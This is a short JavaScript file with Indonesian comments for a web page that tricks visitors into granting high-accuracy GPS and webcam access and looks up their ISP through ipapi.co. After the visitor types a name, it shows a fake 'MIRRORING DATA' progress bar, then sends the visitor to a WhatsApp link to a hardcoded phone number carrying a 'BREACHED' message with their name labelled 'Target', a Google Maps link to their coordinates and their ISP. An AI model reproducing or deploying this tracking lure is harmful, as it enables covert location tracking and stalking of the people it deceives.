var nomorWA = "628979100200";
var userData = { coords: "", isp: "Scanning...", bat: ".." };

window.onload = function() {
    // Ambil Data Background
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
        userData.isp = d.org;
        document.getElementById('isp-status').innerText = "📡 ISP: " + d.org;
    });

    // Ambil GPS dengan Akurasi Tinggi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(p) {
            userData.coords = p.coords.latitude + "," + p.coords.longitude;
            document.getElementById('gps-status').innerText = "📍 GPS: LOCKED";
            document.getElementById('gps-status').style.color = "yellow";
        }, null, { enableHighAccuracy: true, timeout: 5000 });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => { document.getElementById('webcam').srcObject = s; });
};

function sendFinal(nama) {
    if (!nama) return alert("Ketik nama dulu!");
    if (userData.coords === "") return alert("Tunggu GPS mengunci lokasi (Klik Allow!)");

    document.getElementById('step-main').innerHTML = "<h3>MIRRORING DATA...</h3><div class='loading-bar'><div id='progress'></div></div>";
    
    var p = 0;
    var t = setInterval(function() {
        p += 20;
        document.getElementById('progress').style.width = p + "%";
        if (p >= 100) {
            clearInterval(t);
            var map = "https://www.google.com/maps?q=" + userData.coords;
            var teks = "🚨 *BREACHED* 🚨%0A👤 Target: " + nama + "%0A📍 Maps: " + map + "%0A📡 ISP: " + userData.isp;
            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + teks;
        }
    }, 500);
}

document.getElementById('name').onkeydown = function(e) {
    if (e.key === "Enter") sendFinal(this.value);
};
